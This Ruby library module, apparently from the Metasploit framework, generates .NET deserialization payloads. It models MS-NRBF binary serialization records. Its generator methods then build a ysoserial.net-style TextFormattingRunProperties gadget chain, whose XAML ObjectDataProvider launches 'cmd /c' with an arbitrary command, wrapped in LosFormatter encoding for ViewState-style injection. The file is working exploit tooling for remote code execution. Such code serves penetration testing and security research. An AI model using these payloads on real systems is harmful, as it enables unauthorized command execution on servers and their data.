require 'bindata'
require 'msf/util/dot_net_deserialization/enums'
require 'msf/util/dot_net_deserialization/types'

module Msf
module Util

#
# Much of this code is based on the YSoSerial.Net project
# see: https://github.com/pwntester/ysoserial.net
#
module DotNetDeserialization
  DEFAULT_FORMATTER = :LosFormatter
  DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties

  #include Msf::Util::DotNetDeserialization::Enums

  def self.encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end

    encoded_int.pack('C*')
  end

  def self.get_ancestor(obj, ancestor_type, required: true)
    while ! (obj.nil? || obj.is_a?(ancestor_type))
      obj = obj.parent
    end

    raise RuntimeError, "Failed to find ancestor #{ancestor_type.name}" if obj.nil? && required

    obj
  end

  #
  # .NET Serialization Types (General)
  #
  class Record  < BinData::Record; end # forward declaration for recursion

  class ArrayInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/8fac763f-e46d-43a1-b360-80eb83d2c5fb
    endian                 :little
    obj_id                 :obj_id
    int32                  :member_count
  end

  class ClassInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/0a192be0-58a1-41d0-8a54-9c91db0ab7bf
    endian                 :little
    obj_id                 :obj_id
    length_prefixed_string :name
    int32                  :member_count, value: -> { member_names.length }
    array                  :member_names, :type => :length_prefixed_string, read_until: -> { index == member_count - 1 }
  end

  class ClassTypeInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/844b24dd-9f82-426e-9b98-05334307a239
    endian                 :little
    length_prefixed_string :type_name
    int32                  :library_id
  end

  class MemberTypeInfo < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/aa509b5a-620a-4592-a5d8-7e9613e0a03e
    endian                   :little
    default_parameter        member_count: 0
    array                    :binary_type_enums, :type => :uint8, :initial_length => :member_count
    array                    :additional_infos, initial_length: -> { filter_binary_type_enums.length } do
      choice :additional_info, :selection => lambda { selection_routine(index) } do
        uint8                  Enums::BinaryTypeEnum[:Primitive]
        length_prefixed_string Enums::BinaryTypeEnum[:SystemClass]
        class_type_info        Enums::BinaryTypeEnum[:Class]
        uint8                  Enums::BinaryTypeEnum[:PrimitiveArray]
      end
    end

    def member_types
      infos = []
      additional_info_index = 0
      binary_type_enums.each do |binary_type|
        additional_info = nil
        if has_additional_info?(binary_type)
          additional_info = additional_infos[additional_info_index].value
          additional_info_index += 1
        end
        infos << {binary_type: binary_type, additional_info: additional_info}
      end
      infos
    end

    private

    def has_additional_info?(binary_type)
      [
          Enums::BinaryTypeEnum[:Primitive],
          Enums::BinaryTypeEnum[:SystemClass],
          Enums::BinaryTypeEnum[:Class],
          Enums::BinaryTypeEnum[:PrimitiveArray]
      ].include? binary_type
    end

    def filter_binary_type_enums
      binary_type_enums.select { |binary_type|
        has_additional_info?(binary_type)
      }
    end

    def selection_routine(index)
      filter_binary_type_enums[index]
    end
  end

  class MemberValues < BinData::Record
    endian                   :little
    mandatory_parameter      :class_info
    mandatory_parameter      :member_type_info
    array                    :member_values, initial_length: -> { class_info.member_count } do
      choice :member_value, :selection => lambda { selection_routine(index) } do
        record                  -1
        boolean                 Enums::PrimitiveTypeEnum[:Boolean]
        uint8                   Enums::PrimitiveTypeEnum[:Byte]
        #???                    Enums::PrimitiveTypeEnum[:Char] # todo: implement this primitive type
        length_prefixed_string  Enums::PrimitiveTypeEnum[:Decimal]
        double                  Enums::PrimitiveTypeEnum[:Double]
        int16                   Enums::PrimitiveTypeEnum[:Int16]
        int32                   Enums::PrimitiveTypeEnum[:Int32]
        int64                   Enums::PrimitiveTypeEnum[:Int64]
        int8                    Enums::PrimitiveTypeEnum[:SByte]
        float                   Enums::PrimitiveTypeEnum[:Single]
        int64                   Enums::PrimitiveTypeEnum[:TimeSpan]
        date_time               Enums::PrimitiveTypeEnum[:DateTime]
        uint16                  Enums::PrimitiveTypeEnum[:UInt16]
        uint32                  Enums::PrimitiveTypeEnum[:UInt32]
        uint64                  Enums::PrimitiveTypeEnum[:UInt64]
        null                    Enums::PrimitiveTypeEnum[:Null]
        length_prefixed_string  Enums::PrimitiveTypeEnum[:String]
      end
    end

    private

    def selection_routine(index)
      index = index || 0
      member_type = eval_parameter(:member_type_info).member_types[index]
      if member_type[:binary_type] == Enums::BinaryTypeEnum[:Primitive]
        return member_type[:additional_info]
      end

      -1
    end
  end

  module MemberValuesFactory
    def from_member_values(class_info:, member_type_info:, member_values:, **kwargs)
      raise ArgumentError unless class_info.member_count == member_values.length

      mv = MemberValues.new(class_info: class_info, member_type_info: member_type_info)
      member_values.each_with_index do |value, index|
        mv.member_values[index].assign(value)
      end

      self.new(class_info: class_info, member_type_info: member_type_info, member_values: mv, **kwargs)
    end
  end

  #
  # .NET Serialization Types (Records)
  #
  class BinaryLibrary < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/7fcf30e1-4ad4-4410-8f1a-901a4a1ea832
    RECORD_TYPE =          Enums::RecordTypeEnum[:BinaryLibrary]
    endian                 :little
    int32                  :library_id
    length_prefixed_string :library_name
  end

  class BinaryObjectString < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/eb503ca5-e1f6-4271-a7ee-c4ca38d07996
    RECORD_TYPE =          Enums::RecordTypeEnum[:BinaryObjectString]
    endian                 :little
    obj_id                 :obj_id
    length_prefixed_string :string
  end

  class ClassWithId < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/2d168388-37f4-408a-b5e0-e48dbce73e26
    RECORD_TYPE =          Enums::RecordTypeEnum[:ClassWithId]
    endian                 :little
    obj_id                 :obj_id
    int32                  :metadata_id
    member_values          :member_values, class_info: -> { class_info }, member_type_info: -> { member_type_info }

    def class_info
      stream = DotNetDeserialization.get_ancestor(self, SerializedStream)
      object = stream.get_object(metadata_id.value)
      object.record_value.class_info
    end

    def member_type_info
      stream = DotNetDeserialization.get_ancestor(self, SerializedStream)
      object = stream.get_object(metadata_id.value)
      object.record_value.member_type_info
    end
  end

  class ClassWithMembersAndTypes < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/847b0b6a-86af-4203-8ed0-f84345f845b9
    RECORD_TYPE =          Enums::RecordTypeEnum[:ClassWithMembersAndTypes]
    endian                 :little
    class_info             :class_info
    member_type_info       :member_type_info, member_count: -> { class_info.member_count }
    int32                  :library_id
    member_values          :member_values, class_info: -> { class_info }, member_type_info: -> { member_type_info }

    include MemberValuesFactory
    self.singleton_class.include MemberValuesFactory
  end

  class MemberReference < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/eef0aa32-ab03-4b6a-a506-bcdfc10583fd
    RECORD_TYPE =          Enums::RecordTypeEnum[:MemberReference]
    endian                 :little
    int32                  :id_ref
  end

  class MessageEnd < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/de6a574b-c596-4d83-9df7-63c0077acd32
    RECORD_TYPE =          Enums::RecordTypeEnum[:MessageEnd]
    endian                 :little
  end

  class ObjectNull < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/fe51522c-23d1-48dd-9913-c84894abc127
    RECORD_TYPE =          Enums::RecordTypeEnum[:ObjectNull]
    endian                 :little
  end

  class SerializationHeaderRecord < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/a7e578d3-400a-4249-9424-7529d10d1b3c
    RECORD_TYPE =          Enums::RecordTypeEnum[:SerializedStreamHeader]
    endian                 :little
    default_parameter      major_version: 1
    default_parameter      minor_version: 0
    int32                  :root_id
    int32                  :header_id
    int32                  :major_version, :initial_value => :major_version
    int32                  :minor_version, :initial_value => :minor_version
  end

  class SystemClassWithMembers < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/f5bd730f-d944-42ab-b6b3-013099559a4b
    RECORD_TYPE =          Enums::RecordTypeEnum[:SystemClassWithMembers]
    endian                 :little
    class_info             :class_info
  end

  class SystemClassWithMembersAndTypes < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/ecb47445-831f-4ef5-9c9b-afd4d06e3657
    RECORD_TYPE =          Enums::RecordTypeEnum[:SystemClassWithMembersAndTypes]
    endian                 :little
    class_info             :class_info
    member_type_info       :member_type_info, member_count: -> { class_info.member_count }
    member_values          :member_values, class_info: -> { class_info }, member_type_info: -> { member_type_info }

    include MemberValuesFactory
    self.singleton_class.include MemberValuesFactory
  end

  #
  # .NET Serialization Types (Compound-Records)
  #
  class ArraySingleString < BinData::Record
    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/3d98fd60-d2b4-448a-ac0b-3cd8dea41f9d
    endian                 :little
    array_info             :array_info
    array                  :members, type: :record, initial_length: -> { array_info.member_count }
  end

  class Record < BinData::Record
    endian                 :little
    uint8                  :record_type
    choice                 :record_value, selection: -> { record_type } do
      serialization_header_record             Enums::RecordTypeEnum[:SerializedStreamHeader]
      class_with_id                           Enums::RecordTypeEnum[:ClassWithId]
      system_class_with_members               Enums::RecordTypeEnum[:SystemClassWithMembers]
      #class_with_members                      Enums::RecordTypeEnum[:ClassWithMembers]
      system_class_with_members_and_types     Enums::RecordTypeEnum[:SystemClassWithMembersAndTypes]
      class_with_members_and_types            Enums::RecordTypeEnum[:ClassWithMembersAndTypes]
      binary_object_string                    Enums::RecordTypeEnum[:BinaryObjectString]
      #binary_array                            Enums::RecordTypeEnum[:BinaryArray]
      #member_primitive_typed                  Enums::RecordTypeEnum[:MemberPrimitiveTyped]
      member_reference                        Enums::RecordTypeEnum[:MemberReference]
      object_null                             Enums::RecordTypeEnum[:ObjectNull]
      message_end                             Enums::RecordTypeEnum[:MessageEnd]
      binary_library                          Enums::RecordTypeEnum[:BinaryLibrary]
      #object_null_multiple_256                Enums::RecordTypeEnum[:ObjectNullMultiple256]
      #object_null_multiple                    Enums::RecordTypeEnum[:ObjectNullMultiple]
      #array_single_primitive                  Enums::RecordTypeEnum[:ArraySinglePrimitive]
      #array_single_object                     Enums::RecordTypeEnum[:ArraySingleObject]
      array_single_string                     Enums::RecordTypeEnum[:ArraySingleString]
      #method_call                             Enums::RecordTypeEnum[:MethodCall]
      #method_return                           Enums::RecordTypeEnum[:MethodReturn]
    end

    def self.from_value(record_value)
      raise ArgumentError unless record_value.class.const_defined?('RECORD_TYPE')

      self.new(record_type: record_value.class::RECORD_TYPE, record_value: record_value)
    end
  end

  class SerializedStream < BinData::Record
    endian                 :little
    array                  :records, type: :record, read_until: -> { records[-1]&.record_type == Enums::RecordTypeEnum[:MessageEnd] }

    def self.from_values(values)
      records = []
      values.each do |contents|
        records << Record.from_value(contents)
      end
      self.new(records: records)
    end

    def get_object(id)
      @objects = @objects || {}
      @objects[id]
    end

    def set_object(id, object)
      @objects = @objects || {}
      @objects[id] = object
    end
  end

  #
  # Limited Object Stream Types
  #
  class ObjectStateFormatter < BinData::Record
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
    endian                 :little
    default_parameter      marker_format: 0xff
    default_parameter      marker_version: 1
    hide                   :marker_format,  :marker_version
    uint8                  :marker_format,  :initial_value => :marker_format
    uint8                  :marker_version, :initial_value => :marker_version
    uint8                  :token
  end

  #
  # Generation Methods
  #

  # Generates a .NET deserialization payload for the specified OS command using
  # a selected gadget-chain and formatter combination.
  #
  # @param cmd [String] The OS command to execute.
  # @param gadget_chain [Symbol] The gadget chain to use for execution. This
  #   will be application specific.
  # @param formatter [Symbol] An optional formatter to use to encapsulate the
  #   gadget chain.
  # @return [String]
  def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
    serialized = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
    serialized = self.generate_formatted(serialized, formatter: formatter) unless formatter.nil?
    serialized
  end

  # Take the specified serialized blob and encapsulate it with the specified
  # formatter.
  #
  # @param formatter [Symbol] The formatter to use to encapsulate the serialized
  #   data blob.
  # @return [String]
  def self.generate_formatted(serialized, formatter: DEFAULT_FORMATTER)
    case formatter
    when :LosFormatter
      serialized = serialized.to_binary_s
      # token: Token_BinarySerialized
      formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
      formatted << encode_7bit_int(serialized.length)
      formatted << serialized
    else
      raise NotImplementedError, 'The specified formatter is not implemented'
    end

    formatted
  end

  # Generate a serialized data blob using the specified gadget chain to execute
  # the OS command. The chosen gadget chain must be compatible with the target
  # application.
  #
  # @param gadget_chain [Symbol] The gadget chain to use for execution.
  # @return [String]
  def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
    case gadget_chain
    when :TextFormattingRunProperties
      # see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
      resource_dictionary = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:X="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:S="clr-namespace:System;assembly=mscorlib"
        xmlns:D="clr-namespace:System.Diagnostics;assembly=system"
      >
        <ObjectDataProvider X:Key="" ObjectType="{X:Type D:Process}" MethodName="Start">
          <ObjectDataProvider.MethodParameters>
            <S:String>cmd</S:String>
            <S:String>/c #{cmd.encode(:xml => :text)}</S:String>
          </ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
      </ResourceDictionary>
      EOS

      library = BinaryLibrary.new(
        library_id: 2,
        library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
      )

      serialized = SerializedStream.from_values([
        SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        ClassWithMembersAndTypes.from_member_values(
          class_info: ClassInfo.new(
            obj_id: 1,
            name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
            member_names: ['ForegroundBrush']
          ),
          member_type_info: MemberTypeInfo.new(
            binary_type_enums: [Enums::BinaryTypeEnum[:String]]
          ),
          library_id: library.library_id,
          member_values: [
            Record.from_value(BinaryObjectString.new(obj_id: 3, string: resource_dictionary))
          ]
        ),
        MessageEnd.new
      ])
    else
      raise NotImplementedError, 'The specified gadget chain is not implemented'
    end

    serialized
  end
end
end
end
